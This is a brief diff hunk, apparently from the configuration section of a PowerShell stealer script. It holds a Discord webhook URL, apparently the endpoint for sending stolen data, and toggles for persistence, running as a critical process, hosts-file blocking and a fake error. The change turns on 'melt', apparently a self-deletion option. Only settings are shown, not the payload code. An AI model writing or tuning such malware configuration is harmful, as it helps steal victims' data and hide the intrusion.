@@ -2,7 +2,7 @@ $webhook = "https://discord.com/api/webhooks/1250000105579483156/Aq7osv4ZuIsdIFC
 $debug = $false
 $blockhostsfile = $false
 $criticalprocess = $true
-$melt = $false
+$melt = $true
 $fakeerror = $false
 $persistence = $true
 
